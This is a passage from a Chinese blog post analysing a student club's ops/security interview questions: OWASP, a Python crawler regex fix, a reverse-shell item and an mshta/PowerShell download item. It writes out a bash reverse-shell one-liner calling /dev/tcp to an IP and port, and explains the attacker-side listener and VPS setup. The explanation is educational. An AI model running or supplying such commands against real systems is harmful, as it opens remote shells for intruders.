+<h5 id="0x06-是否知道owasp-top-10-，细说一下对他们的了解。"><a href="#0x06-是否知道owasp-top-10-，细说一下对他们的了解。" class="headerlink" title="0x06 是否知道owasp top 10 ，细说一下对他们的了解。"></a>0x06 是否知道owasp top 10 ，细说一下对他们的了解。</h5><p>这个我就被问的很细了。我就放个链接吧，比我讲的详细。<br>不黑，也不吹<br><a href="https://www.cnblogs.com/cute-puli/p/11099543.html" target="_blank" rel="noopener">OWASP——开放式web应用程序安全项目</a><br>笔者被问的最多的还是sql注入<br>。。。。。。<br>自行脑补</p>
+<h5 id="0x07-1"><a href="#0x07-1" class="headerlink" title="0x07"></a>0x07</h5><p><img src="https://img-blog.csdnimg.cn/20191013231424898.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191013231452776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191013231519206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191013231544825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本题考查正则表达式<br>报错消息，提示语法错误<br>然后改了一下，问题出在re.compile(“ “,re.S)<br>中的” “,<br>因为正则表达式中有” “存在<br>所以将” “,改成单引号’ ‘即可。运行成功，没有报错。运行截图如下<br><img src="https://img-blog.csdnimg.cn/20191013232107398.png" alt="在这里插入图片描述"><br>没有匹配到任何东西，然后这地方就比较坑<br>笔者尝试了好久，改了好多东西<br>最终发现问题出在”data-src”处<br>将”-“去掉后，再次运行，得到<br><img src="https://img-blog.csdnimg.cn/20191013232320623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上图即为想要提取的信息<br>笔者在面试这一题的时候，一位安全学长又问了一些爬虫方面的东西。<br>就比较<strong>尬</strong><br>。。。。。。</p>
+<h5 id="0x08-1"><a href="#0x08-1" class="headerlink" title="0x08"></a>0x08</h5><p><img src="https://img-blog.csdnimg.cn/20191013232505796.png" alt="在这里插入图片描述"><br>这题考查反弹shell<br>分为三部分看<br>1—-   bash -i   表示一个交互式shell<br>2—-    &gt;&amp;/dev/tcp/192.168.1.22/1314  表示建立一个TCP连接，端口为1314<br>(这也是linux中一切皆文件的体现)<br>3—-   0&gt;&amp;1 是将交互式shell反弹<br>笔者在面试这一题时，还被一位学长问到了攻击者与宿主机的端口关系<br>简单来说，就是攻击者在执行上述命令前，需要在本地监听1314端口。<br>值得注意的是，如果上述场景运用到内网中，攻击者就需要提前准备一个vps，<br>且具有独立的公网ip，将上诉命令中的ip改为公网ip，即可</p>
+<p> shell脚本具体还有0，1，2，&amp;，&gt;,&lt;的用法,有兴趣的读者可仔细研究。<br> 确实挺有用的</p>
+<h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><p> <img src="https://img-blog.csdnimg.cn/20191013233959913.png" alt="在这里插入图片描述"><br> emmmmmm，终于最后一题了，不过没有被问到。<br> 吹一波，这题是我彭学长出的题。<br> 分析如下，在命令行powershell中 执行 mshta ，然后去解析参数中的html，请求参数中url的资源。<br> (0x68,0x74,0x74,0x70)为16进制，转化为ascii后为http，这样就好理解了。<br> 重点是脚本中的mshta<br> <img src="https://img-blog.csdnimg.cn/20191013234539181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNTM4MTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 简述之就是去解析html，然后在powershell下请求这个资源<br> 理解了mshta的作用，这题差不多就搞定了</p>
+<h5 id="0x10-1"><a href="#0x10-1" class="headerlink" title="0x10"></a>0x10</h5><p><img src="https://img-blog.csdnimg.cn/20191013234748989.png" alt="在这里插入图片描述"><br>霸面玩不来，who can who up 吧<br>。。。。。。。。。。。。。。。。。。。。。。</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>经过这次面试，暴漏了很多问题，也看到了自己各方面的薄弱之处。然后将题目浅析分享给大家。不管面试能不能过，在这次面试中有所收获，有所提升，有所进步，才是最重要的啦。。。<br>有问题可以私信联系我，大家一起探讨。</p>
+<h2 id="以上，有一些我可能表述不到位或者理解有误的，感谢指教【鞠躬"><a href="#以上，有一些我可能表述不到位或者理解有误的，感谢指教【鞠躬" class="headerlink" title="以上，有一些我可能表述不到位或者理解有误的，感谢指教【鞠躬"></a>以上，有一些我可能表述不到位或者理解有误的，感谢指教【鞠躬</h2>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/12/python%E4%B8%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B5%81%E6%96%87%E4%BB%B6%E8%BD%AC%E4%BA%8C%E7%BB%B4%E7%A0%81/" rel="next" title="python下二进制流文件转二维码">
+                <i class="fa fa-chevron-left"></i> python下二进制流文件转二维码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/12/(%E4%BA%8C%E9%9D%A2)%E6%99%BA%E9%82%AE%E6%99%AE%E5%88%9B%E5%B7%A5%E4%BD%9C%E5%AE%A42019%E7%A7%8B%E5%AD%A3%E7%BA%B3%E6%96%B0%E9%A2%98%20(%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91)%E6%B5%85%E6%9E%90/" rel="prev" title="(二面)智邮普创工作室2019秋季纳新题 (运维安全方向)浅析">
+                (二面)智邮普创工作室2019秋季纳新题 (运维安全方向)浅析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="小灰灰" />
+            
+              <p class="site-author-name" itemprop="name">小灰灰</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wikeys.github.io/" title="彭哥哥的博客" target="_blank">彭哥哥的博客</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#声明-以下浅析仅为个人见解，如有不同意见，欢迎各路大神前来探讨，大家共同进步"><span class="nav-number">1.</span> <span class="nav-text">声明  以下浅析仅为个人见解，如有不同意见，欢迎各路大神前来探讨，大家共同进步</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础题部分"><span class="nav-number">1.1.</span> <span class="nav-text">基础题部分</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-1000G硬盘容量相当于1000M硬盘的多少倍？"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">0x01  1000G硬盘容量相当于1000M硬盘的多少倍？</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#有图有证据"><span class="nav-number">1.1.0.1.1.</span> <span class="nav-text">有图有证据</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x04"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x05-你用过strlen和sizeof函数吗？它们的作用是什么？它们的区别又是什么？"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">0x05  你用过strlen和sizeof函数吗？它们的作用是什么？它们的区别又是什么？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x06-你所了解过的循环有哪些？它们有什么区别呢？"><span class="nav-number">1.1.0.6.</span> <span class="nav-text">0x06 你所了解过的循环有哪些？它们有什么区别呢？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x07"><span class="nav-number">1.1.0.7.</span> <span class="nav-text">0x07</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x08"><span class="nav-number">1.1.0.8.</span> <span class="nav-text">0x08</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x09-尽可能多的说出你所了解的排序算法，它们的时间复杂度和稳定性又如何？"><span class="nav-number">1.1.0.9.</span> <span class="nav-text">0x09  尽可能多的说出你所了解的排序算法，它们的时间复杂度和稳定性又如何？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x10"><span class="nav-number">1.1.0.10.</span> <span class="nav-text">0x10</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方向题部分-运维-amp-安全"><span class="nav-number">1.2.</span> <span class="nav-text">方向题部分(运维&amp;安全)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-Linux如何新建用户，并设置为管理员？"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">0x01 Linux如何新建用户，并设置为管理员？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-CentOS-、Debian如何设置静态IP地址、配置本地镜像为源。"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">0x02 CentOS 、Debian如何设置静态IP地址、配置本地镜像为源。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-1"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x04-1"><span class="nav-number">1.2.0.4.</span> <span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x05-常见的应用中有哪些是应用TCP协议的，哪些又是应用UDP协议的，为什么它们被如此设计？（以QQ为例说明）"><span class="nav-number">1.2.0.5.</span> <span class="nav-text">0x05 常见的应用中有哪些是应用TCP协议的，哪些又是应用UDP协议的，为什么它们被如此设计？（以QQ为例说明）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x06-是否知道owasp-top-10-，细说一下对他们的了解。"><span class="nav-number">1.2.0.6.</span> <span class="nav-text">0x06 是否知道owasp top 10 ，细说一下对他们的了解。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x07-1"><span class="nav-number">1.2.0.7.</span> <span class="nav-text">0x07</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x08-1"><span class="nav-number">1.2.0.8.</span> <span class="nav-text">0x08</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x09"><span class="nav-number">1.2.0.9.</span> <span class="nav-text">0x09</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x10-1"><span class="nav-number">1.2.0.10.</span> <span class="nav-text">0x10</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后记"><span class="nav-number">1.3.</span> <span class="nav-text">后记</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#以上，有一些我可能表述不到位或者理解有误的，感谢指教【鞠躬"><span class="nav-number">2.</span> <span class="nav-text">以上，有一些我可能表述不到位或者理解有误的，感谢指教【鞠躬</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小灰灰</span>
+
+  
+</div>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!--  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
